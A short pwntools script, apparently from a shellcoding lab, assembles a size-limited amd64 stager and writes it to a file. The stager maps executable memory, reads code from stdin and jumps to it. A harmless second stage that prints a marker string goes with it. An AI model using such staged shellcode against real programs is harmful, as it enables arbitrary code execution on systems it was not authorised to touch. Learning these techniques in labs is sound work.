from pwn import asm, context

context.arch = "amd64"
stage1 = asm("""
    mov eax, 9
    xor edi, edi
    mov esi, 0x1000
    mov edx, 7
    mov r10d, 0x22
    push -1
    pop r8
    xor r9d, r9d
    syscall
    mov rsi, rax
    xor eax, eax
    xor edi, edi
    mov edx, 512
    syscall
    jmp rsi
""")
stage2 = asm("""
    mov eax, 1
    mov edi, 1
    mov edx, 9
    lea rsi, [rip + message]
    syscall
    mov eax, 60
    xor edi, edi
    syscall
message:
    .ascii "STAGED_OK"
""")
assert len(stage1) <= 64
open("/home/hacker/payload.bin", "wb").write(stage1)
open("/home/hacker/stage2.bin", "wb").write(stage2)
